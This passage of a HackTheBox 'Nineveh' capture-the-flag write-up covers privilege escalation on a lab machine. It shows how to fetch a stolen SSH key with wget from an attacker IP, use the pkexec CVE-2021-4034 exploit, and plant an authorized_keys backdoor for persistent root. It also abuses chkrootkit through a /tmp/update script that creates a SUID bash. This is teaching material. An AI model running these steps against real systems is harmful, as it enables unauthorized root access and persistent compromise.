</pre></table></code></div></div></ol><h1 id="privilege-escalation---1">Privilege Escalation - 1</h1><h2 id="amrois---via-ssh-private-key">Amrois - Via SSH Private Key <a href="#amrois---via-ssh-private-key" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Earlier, we found SSH private key, transfer it to <code class="language-plaintext highlighter-rouge">http://nineveh.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> www-data@nineveh:/tmp$ wget 10.10.14.31/nineveh.priv
 --2022-08-23 14:34:21--  http://10.10.14.31/nineveh.priv
 Connecting to 10.10.14.31:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 1675 (1.6K) [application/octet-stream]
 Saving to: 'nineveh.priv'
	
 nineveh.priv                  100%[==============================================&gt;]   1.64K  --.-KB/s    in 0s      
	
 2022-08-23 14:34:21 (262 MB/s) - 'nineveh.priv' saved [1675/1675]
	
</pre></table></code></div></div><li>Change permission of <code class="language-plaintext highlighter-rouge">nineveh.priv</code> and SSH<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> www-data@nineveh:/tmp$ chmod 600 nineveh.priv 
 www-data@nineveh:/tmp$ ssh amrois@localhost -i nineveh.priv 
</pre></table></code></div></div><li>Obtained <code class="language-plaintext highlighter-rouge">amrois</code> shell &amp; User Flag<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> 390ff4e95074a5a0499f8e065fcedce9
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824033715.png" alt="" data-proofer-ignore></p></ol><h2 id="root---via-cve-2021-4034">Root - Via CVE-2021-4034 <a href="#root---via-cve-2021-4034" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found something interesting w/ <code class="language-plaintext highlighter-rouge">linpeas.sh</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824040103.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">CVE-2021-4034</code></ul><li>Try <code class="language-plaintext highlighter-rouge">CVE-2021-4034.py</code><ol><li>How does the exploit work?<ul><li>Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes.<li>Due to an improper implementation of the pkexec tool, an out-of-bounds memory access can be leveraged by a local attacker to escalate their privileges to system root.</ul><li><a href="https://github.com/joeammond/CVE-2021-4034">Download Exploit</a><li>Transfer to <code class="language-plaintext highlighter-rouge">nineveh.htb</code> &amp; Exploit</ol><li>Obtained Root Shell &amp; Root Flag<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> 3fa9f72b3965a409759533e147293627
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824040002.png" alt="" data-proofer-ignore></p><li>Obtain a persitent/stable root access<ol><li>Create private key for <code class="language-plaintext highlighter-rouge">Amorois</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> amrois@nineveh:/tmp$ ssh-keygen -t rsa
</pre></table></code></div></div><li>Create <code class="language-plaintext highlighter-rouge">/root/.ssh</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> # mkdir -p /root/.ssh
</pre></table></code></div></div><li>Place <code class="language-plaintext highlighter-rouge">Amrois</code> public key into <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD6ItIHY3OMLlsiLCB0FlW7Q5kGTHbORLFAxKzj3xS3mic7t2GDgwOEX2ZZQF5QVJQlRkZ/OGU3Fc++TCtKXSBvaWjAs3DIqaucyfaOaJ/MVi4sVzpRB4diErdjsGStx81QcoV8vl1o+GGHSjIHJsBbuVirVrE665RUu4M62tdk8bzzRj8j7gAVPOxYPO6UIQfjtA3n80cGCQnRLRhQivO4icxo+neiP/W9esV/JwjTYUzowynR86PF+ae9ABkdUveBQqWso8tI7/pGE9DycNLgfaXR9mGwH1ZQzySiG4mlyty568GCQvvhWkryHG4WhqE4NKbOUJlgvGXUevl/h3Rl amrois@nineveh" &gt; /root/.ssh/authorized_keys
</pre></table></code></div></div><li>Change permission of <code class="language-plaintext highlighter-rouge">authorized_keys</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> chmod 700 /root/.ssh
 chmod 600 /root/.ssh/authorized_keys
</pre></table></code></div></div><li>SSH w/ <code class="language-plaintext highlighter-rouge">Amorois</code> private key<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> amrois@nineveh:~/.ssh$ ssh -i yes root@localhost
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824041701.png" alt="" data-proofer-ignore></p></ol></ol><h1 id="privilege-escalation---2">Privilege Escalation - 2</h1><h2 id="root---chrookit-exploit">Root - Chrookit Exploit <a href="#root---chrookit-exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found something interesting w/ <code class="language-plaintext highlighter-rouge">pspy64</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824045320.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">chkrootkit</code> is executed as root.</ul><li><p>Search exploits for <code class="language-plaintext highlighter-rouge">chkrootkit</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>Chkrootkit 0.49 - Local Privilege Escalation<td>linux/local/33899.txt</table></div><li>Try <code class="language-plaintext highlighter-rouge">33899.txt</code><ol><li>How does the exploit work?<ul><li>The line <code class="language-plaintext highlighter-rouge">'file_port=$file_port $i'</code> will execute all files specified in <code class="language-plaintext highlighter-rouge">$SLAPPER_FILES</code> as the user <code class="language-plaintext highlighter-rouge">chkrootkit</code> is running (usually <code class="language-plaintext highlighter-rouge">root</code>), if <code class="language-plaintext highlighter-rouge">$file_port</code> is empty, because of missing quotation marks around the variable assignment.</ul><li><code class="language-plaintext highlighter-rouge">/tmp/update</code> will be executed as <code class="language-plaintext highlighter-rouge">root</code> due to the vulnerability<li>Create script to set SUID bit on <code class="language-plaintext highlighter-rouge">/bin/bash</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> amrois@nineveh:~$ nano /tmp/update
		
 cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash

 amrois@nineveh:~$ chmod +x /tmp/update
</pre></table></code></div></div><li>Wait for <code class="language-plaintext highlighter-rouge">chkrootkit</code> to execute<li>Obtained Root Shell <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824050658.png" alt="" data-proofer-ignore></ol></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploit-file-inclusion-lfi/" class="post-tag no-text-decoration" >exploit/file-inclusion/lfi</a> <a href="/tags/image-forensics/" class="post-tag no-text-decoration" >image-forensics</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Nineveh - Yufong&amp;u=https://yufongg.github.io/posts/Nineveh/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/UpDown/"><div class="card-body"> <em class="timeago small" data-ts="1674403200" > 2023-01-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - UpDown</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, /dev/.git is discovered, since .git is found, we are able to view the logs and commits of the git repository, providing us w/ the header needed to...</p></div></div></a></div><div class="card"> <a href="/posts/Paper/"><div class="card-body"> <em class="timeago small" data-ts="1655395200" > 2022-06-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Paper</h3><div class="text-muted small"><p> Overview This machine begins w/ a wordpress 5.2.3 exploit, allowing us to view private post w/o being authenticated, revealing a subdomain chat.office.paper. A chatbot is running on chat.office.pa...</p></div></div></a></div><div class="card"> <a href="/posts/Trick/"><div class="card-body"> <em class="timeago small" data-ts="1659196800" > 2022-07-31 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Trick</h3><div class="text-muted small"><p> Overview This machine begins w/ DNS enumeration, revealing a subdomain preprod-payroll.trick.htb that running a recruitment management system via nginx. The recruitment management system is suscept...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Cronos/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Cronos</p></a> <a href="/posts/Sense/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Sense</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Nineveh/'; this.page.identifier = '/posts/Nineveh/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
